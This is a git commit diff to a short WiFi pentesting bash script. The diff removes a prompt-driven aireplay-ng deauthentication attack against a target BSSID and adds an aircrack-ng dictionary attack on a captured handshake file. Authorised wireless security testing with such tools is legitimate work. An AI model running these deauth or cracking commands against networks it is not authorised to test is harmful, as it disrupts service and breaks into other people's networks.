6559ccf19ac0d329381dd63103196d54a3197379
Rohit Soni <92707347+rohitsoniinfo@users.noreply.github.com>
2023-09-16 22:57:50 +0530

    Update postAutomate.sh

--- postAutomate.sh
+++ postAutomate.sh
@@ -1,6 +1,15 @@
 #!/bin/bash
-cd /home/kali/WifiPentesting/testingSomething
-echo "enter the bssid of the target "
-read BSSID 
-sudo aireplay-ng -a $BSSID --deauth 300 wlan0 
 
+# Change to the directory where your WiFi pentesting tools are located.
+cd /home/kali/WifiPentesting/testingSomething
+
+# Prompt the user to enter the file path of the captured file (likely the output file from airodump-ng).
+echo "Enter the file path of the captured file:"
+read FILE
+
+# Prompt the user to enter the password list to be used for the attack.
+echo "Enter the password list:"
+read PASSWORDLIST
+
+# Use aircrack-ng to attempt to crack the WiFi password using the captured file and the provided password list.
+sudo aircrack-ng $FILE -w $PASSWORDLIST
